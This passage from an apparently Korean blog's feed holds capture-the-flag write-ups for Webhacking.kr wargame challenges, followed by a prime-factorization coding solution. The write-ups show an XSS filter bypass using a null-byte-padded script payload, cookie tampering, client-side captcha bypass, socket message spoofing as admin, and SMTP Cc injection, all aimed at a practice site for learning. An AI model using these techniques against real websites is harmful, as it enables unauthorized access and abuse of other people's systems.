class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번엔 Get 메소드의 addr 파라미터 값이 127.0.0.1이 되야지만, 다음 문제로 넘어갈 수 있다.</p><p><img src="/images/pasted-373.png"><br><code>addr=127.0.0.1</code>를 넘겨주고, 다음 문제로 넘어갈 수 있었다.</p><h3 id="33-9-풀이"><a href="#33-9-풀이" class="headerlink" title="33-9 풀이"></a>33-9 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">97</span>;$i&lt;=<span class="number">122</span>;$i=$i+<span class="number">2</span>)&#123;</span><br><span class="line">  $answer.=chr($i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;ans&#x27;</span>] == $answer) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???.php&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번엔 아스키코드 97부터 122번까지 2씩 증가하여 나온 값을 answer에 넣어줘야한다.</p><p>간단하게 코딩으로 하지않고, 직접 구해보았다.</p><p>acegikmoqsuwy이라는 값을 구하였고, 값을 Get 메소드로 전달하였다.</p><p><img src="/images/pasted-374.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-10-풀이"><a href="#33-10-풀이" class="headerlink" title="33-10 풀이"></a>33-10 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_SERVER[‘REMOTE_ADDR’];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=strlen($ip);$i++) $ip=str_replace($i,ord($i),$ip);</span><br><span class="line">$ip=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip);</span><br><span class="line">$ip=substr($ip,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">$answer = $ip*<span class="number">2</span>;</span><br><span class="line">$answer = $ip/<span class="number">2</span>;</span><br><span class="line">$answer = str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$answer);</span><br><span class="line">$f=fopen(“answerip/&#123;$answer&#125;_&#123;$ip&#125;.php”,”w”);</span><br><span class="line">fwrite($f,”<span class="meta">&lt;?php</span> <span class="keyword">include</span> \”../../../config.php\”; solve(<span class="number">33</span>); unlink(<span class="keyword">__FILE__</span>); <span class="meta">?&gt;</span>”);</span><br><span class="line">fclose($f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>answer이 구해지는 코드를 파이썬으로 구현하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">start = <span class="number">0</span></span><br><span class="line">end = <span class="built_in">len</span>(ip)</span><br><span class="line"><span class="keyword">while</span> start &lt;= end:</span><br><span class="line">    ip = ip.replace(<span class="built_in">str</span>(start), <span class="built_in">str</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(start)[<span class="number">0</span>])))</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">    end = <span class="built_in">len</span>(ip)</span><br><span class="line"></span><br><span class="line">ip = ip.replace(‘.’, ‘’)[:<span class="number">10</span>]</span><br><span class="line">answer = <span class="built_in">str</span>(<span class="built_in">int</span>(ip) / <span class="number">2</span>).replace(‘.’, ‘’)</span><br><span class="line">print(<span class="string">f&#x27;answerip/<span class="subst">&#123;answer&#125;</span>_<span class="subst">&#123;ip&#125;</span>.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p>이때 파이썬과 PHP 간의 차이점을 알 수 있었다.</p><p>PHP의 For문 같은 경우,<br>ip의 길이를 최대 반복 수로 지정하였는데 ip의 길이가 증가할 때마다 최대 반복 수가 그것을 반영하여 반복 수가 증가하였다.</p><p>Pytho의 경우,<br>한번 지정된 최대 반복 수는 고정이다.</p><p>이것을 몰라서 계속 잘못된 곳을 찾고 있었는데, PHP로 반복문의 반복 수를 찍어보니 알 수 있었다.<br>그래서 파이썬으로 구현된 코드는 for문으로 구현하지 않고 while문으로 구현하였다.</p><p>출력된 값을 <code>answerip/&#123;$answer&#125;_&#123;$ip&#125;.php</code>에 대입하여 서버로 전달하였다.<br>이때 IP의 값은 <code>ip = ip.replace(‘.’, ‘’)[:10]</code>의 값이다.</p><p><img src="/images/pasted-375.png"><br>이렇게 개고생을 하여 flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-33-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 23 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-23-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-23-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 14:36:11 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-23"><a href="#Old-23" class="headerlink" title="Old - 23"></a>Old - 23</h2><p><img src="/images/pasted-360.png"><br>이번 문제는 xss 문제인 것 같다.</p><p>일단, 밑에 나온 alert 창을 띄우는 스크립트를 삽입하면 어떻게 반응하는지 확인하였다.</p><p><img src="/images/pasted-361.png"><br><code>&lt;script&gt;alert(1);&lt;/script&gt;</code><br>스크립트가 서버의 xss 필터에 걸리면, no hack을 출력하는 것을 볼 수 있다.</p><p>혹시 자바스크립트로 xss 필터 기능을 정의했는지 또는 주석으로 힌트가 있는지 확인해보았다.<br><br>확인한 결과 PHP에서 xss필터 기능을 정의되었고, 코드 상에는 힌트가 없었다.</p><p>그렇다면, xss 필터가 어떤 것을 필터링하는지 확인을 해야한다.</p><p>필터링 목록</p><ul><li>script</li><li>alert</li><li>Xss에 사용되는 HTML 태그 (img, svg, onclock, onerror 등등)</li></ul><p>손으로 직접쳐서 확인한 결과 대문자 상관없이 script와 alert가 필터링 되어있었다.<br><br>또한 단어에서 사용된 알파벳 2이상 조합하는 것도 필터링 되었다.<br>e.g.) sc, ri, cs, al, lt</p><p>하지만, 특수문자는 필터링이 되어있지 않았다.</p><p>필터링을 우회하기 위해 나는 이중 인코딩, Null 바이트를 사용하여 우회를 시도하였다.</p><p>일단, 문제에서 주어진 것은 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>이라서 이것을 가지고 시도하였다.</p><h3 id="이중-인코딩"><a href="#이중-인코딩" class="headerlink" title="이중 인코딩"></a>이중 인코딩</h3><p><img src="/images/pasted-362.png" alt="upload successful"><br> <code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</code>를 이중 url 인코딩 한 값을 서버로 보내니, 한번의 디코딩 후 출력되어 필터링을 우회할 수 없었다.</p><h3 id="Null-바이트"><a href="#Null-바이트" class="headerlink" title="Null 바이트"></a>Null 바이트</h3><p>필터에 걸리는 script와 alert의 알파벳 사이에 null 바이트를 넣어서 서버로 보냈다.</p><p><img src="/images/pasted-363.png" alt="`&lt;%00s%00c%00r%00i%00p%00t&gt;%00a%00l%00e%00r%00t(1);&lt;/%00s%00c%00r%00i%00p%00t&gt;`"></p><p>그 결과 xss이 성공하여 flag를 획득할 수 있다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-23-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 20 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-20-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-20-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 14:34:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-20"><a href="#Old-20" class="headerlink" title="Old - 20"></a>Old - 20</h2><p><img src="/images/pasted-357.png"><br>페이지를 확인하니, 입력 폼과 맨 위 가운데에 나타난 time limit가 눈에 띄었다.</p><p>대충 감으로 생각했을 때 2초 안으로 입력하라는 미션같다.</p><p><img src="/images/pasted-358.png"><br>시간 제한을 신경 안쓰고, 서버에 값을 보내니 Too Slow 문구가 출력되고 몇 초 지나서 원래의 페이지로 돌아갔다.</p><p>나는 자바스크립트를 이용하여 입력값을 넣고, 서버에 전송하여 2초를 넘기지 않고 서버로 값을 보내기 위해서는 코드를 작성하여 보내는 방법 밖에 없을거라 생각하여 코드를 작성하기 위해 개발자 도구로 페이지 코드를 확인하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ck</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.id.value==<span class="string">&quot;&quot;</span></span>)</span> &#123; lv5frm.id.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.cmt.value==<span class="string">&quot;&quot;</span></span>)</span> &#123; lv5frm.cmt.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.captcha.value==<span class="string">&quot;&quot;</span></span>)</span> &#123; lv5frm.captcha.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">lv5frm.captcha.value!=lv5frm.captcha_.value</span>)</span> &#123; lv5frm.captcha.focus(); <span class="keyword">return</span>; &#125;</span><br><span class="line">  lv5frm.submit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>문제의 출제가 아주 보기 좋게 각 Input의 ID로 Input의 값을 검사하는 코드가 있어서 이것을 보고 간단하게 코드를 작성하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lv5frm.id.value = <span class="string">&quot;test&quot;</span></span><br><span class="line">lv5frm.cmt.value = <span class="string">&quot;test&quot;</span></span><br><span class="line">lv5frm.captcha.value = lv5frm.captcha_.value</span><br><span class="line">lv5frm.submit()</span><br></pre></td></tr></table></figure><p>개발자 도구의 콘솔을 열린 채로 페이지를 재로딩하여 페이지가 뜨자마자 저 코드들을 붙여넣기하여 실행하였다.</p><p><img src="/images/pasted-359.png"><br>그 결과 Flag를 획득 할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-20-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 1 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-1-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-1-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 14:32:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-1"><a href="#Old-1" class="headerlink" title="Old - 1"></a>Old - 1</h2><p><img src="/images/pasted-354.png"><br>들어가면, Level 1이라는 글과 소스코드를 볼 수 있는 링크가 페이지에 출력되어 있다.</p><p>페이지에 아무 반응이 없어서 코드를 살펴보았다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;../../config.php&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">&#x27;view-source&#x27;</span>] == <span class="number">1</span>)&#123; view_source(); &#125;</span><br><span class="line">  <span class="keyword">if</span>(!$_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>])&#123;</span><br><span class="line">    SetCookie(<span class="string">&quot;user_lv&quot;</span>,<span class="string">&quot;1&quot;</span>,time()+<span class="number">86400</span>*<span class="number">30</span>,<span class="string">&quot;/challenge/web-01/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;meta http-equiv=refresh content=0&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>맨 처음에 정의된 코드인데, user_lv이라는 쿠키를 1로 지정한다는 코드였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric($_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>])) $_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) $_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;level : <span class="subst">&#123;$_COOKIE[&#x27;user_lv&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿠키를 지정한 후 쿠키의 값을 검사하는데, 조건이  <code>3 &lt; user_lv =&lt; 4</code>이라는 조건에 해당하면 flag를 획득할 수 있다는 것이였다.</p><p><img src="/images/pasted-355.png"><br>이를 토대로 난 쿠키의 값을 3.1로 지정하여 페이지를 다시 불려왔다.</p><p><img src="/images/pasted-356.png"><br>flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-1-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 58 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-58-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-58-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 14:29:53 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-58"><a href="#Old-58" class="headerlink" title="Old - 58"></a>Old - 58</h2><p><img src="/images/pasted-349.png"><br>이번엔 채팅앱 같은 페이지가 나왔다.</p><p><img src="/images/pasted-350.png"><br>aaaa를 입력하니, command not found라는 문구가 출력이 되었다.<br><br>command라는 단어를 보는 순간 난 ls 명령어를 입력하여 서버로 보냈다.</p><p><img src="/images/pasted-351.png"><br>파일 이름이 출력되었다. 다른 명령어들을 입력해보았지만, 모두 command not found라는 문구가 출력이 되었다.<br><br>그러다가 flag을 입력해보니, 다른 문구가 출력이 되었다.</p><p><img src="/images/pasted-352.png"><br>admin만 사용이 가능하다는 문구였다.<br><br>더이상 찾을 것이 없을 거 같아서 개발자 도구를 통해 코드를 살펴보았다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> socket = io();</span><br><span class="line">  $(<span class="string">&#x27;form&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    socket.emit(<span class="string">&#x27;cmd&#x27;</span>,username+<span class="string">&quot;:&quot;</span>+$(<span class="string">&#x27;#m&#x27;</span>).val());</span><br><span class="line">    $(<span class="string">&#x27;#m&#x27;</span>).val(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">  socket.on(<span class="string">&#x27;cmd&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    $(<span class="string">&#x27;#messages&#x27;</span>).append($(<span class="string">&#x27;&lt;li&gt;&#x27;</span>).text(msg));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p>소켓 통신을 하는 스크립트가 있었다.</p><p>emit 함수는 서버로 데이터를 보내는 함수이고, on 함수는 서버에서 데이터를 받는 함수였다.<br><br>서버로 보내는 값을 보니, <code>guest:input에 입력한 값</code>을 보내고 있었다.</p><p>나는 이를 <code>admin:flag</code>로 변경하여 서버에 보내서 flag를 획득할 계획을 생각하였다.<br><br>개발자 도구의 콘솔로 admin으로 flag를 요청하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = io();</span><br><span class="line">socket.emit(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&quot;admin:flag&quot;</span>);</span><br><span class="line">socket.on(</span><br><span class="line"><span class="string">&#x27;cmd&#x27;</span>, </span><br><span class="line">(msg) =&gt; $(<span class="string">&#x27;#messages&#x27;</span>).append( $(<span class="string">&#x27;&lt;li&gt;&#x27;</span>).text(msg) )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-353.png"><br>그 결과 flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-58-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 47 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-47-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-47-Write-Up/</guid>
      <pubDate>Wed, 12 May 2021 14:28:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-47"><a href="#Old-47" class="headerlink" title="Old - 47"></a>Old - 47</h2><p><img src="/images/pasted-345.png"><br>Mail subject라고 라벨이 있는 것으로 보아서, 메일을 보낸다는 것을 추측했다.</p><p><img src="/images/pasted-346.png"><br>Input에 기본값으로 지정된 값을 그대로 서버로 보내니,  메일을 보냈다는 문구가 출력되었다.</p><p>문제를 보고 난 BeeBox의 SMTP 문제를 생각할 수 있었다.<br><br>Input에 Cc을 넣어서 메일을 공격자가 원하는 메일로 참조하는 공격이였다.</p><p>위 방법대로 공격해보도록 하겠다.</p><p><img src="/images/pasted-347.png"><br>Post 메소드로 값을 넘겨주기 때문에 body 안에 Cc를  삽입하여 보냈다.</p><p><img src="/images/pasted-348.png"><br>그 결과 Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-47-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 실버 11653번 문제</title>
      <link>https://lrtk-coder.github.io/2021/05/11/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11653%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/05/11/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11653%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Tue, 11 May 2021 10:44:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;소인수분해&quot;&gt;&lt;a href=&quot;#소인수분해&quot; class=&quot;headerlink&quot; title=&quot;소인수분해&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/11653&quot;&gt;소인수분해&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;정수 N이 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="소인수분해"><a href="#소인수분해" class="headerlink" title="소인수분해"></a><a href="https://www.acmicpc.net/problem/11653">소인수분해</a></h1><p>정수 N이 주어졌을 때, 소인수분해하는 프로그램을 작성하시오.</p><h2 id="문제-풀이-1"><a href="#문제-풀이-1" class="headerlink" title="문제 풀이 - 1"></a>문제 풀이 - 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            n = n//i</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>풀긴 했으나, 성능이 너무 안 좋아서, 좀 더 효율적으로 변경을 해야한다.</p><p>현재 이 코드의 시간 복잡도는 O(n^2)이다.<br><br>이 때문에 체점 시간이 1060ms이라는 엄청난 결과를 얻을 수 있었다.</p><h2 id="문제-풀이-2"><a href="#문제-풀이-2" class="headerlink" title="문제 풀이 - 2"></a>문제 풀이 - 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">        n = n//i</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="풀이-설명-1"><a href="#풀이-설명-1" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>O(n)으로 변경하여 체점하였지만, 오히려 시간이 증가하였다…<br><br>수학에 기초가 부족한 나에겐 하루종일 걸릴거 같아서 다른 사람의 풀이를 참고하였다.</p><h2 id="문제-풀이-3"><a href="#문제-풀이-3" class="headerlink" title="문제 풀이 - 3"></a>문제 풀이 - 3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">r = <span class="built_in">int</span>(n ** <span class="number">0.5</span>)</span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= r:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> n % i:</span><br><span class="line">        n //= i</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n &gt; <span class="number">1</span>:</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><h3 id="풀이-설명-2"><a href="#풀이-설명-2" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>다른 분들은 루트의 근사값을 이용하여 반복 횟수를 줄임으로써 시간을 절약하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
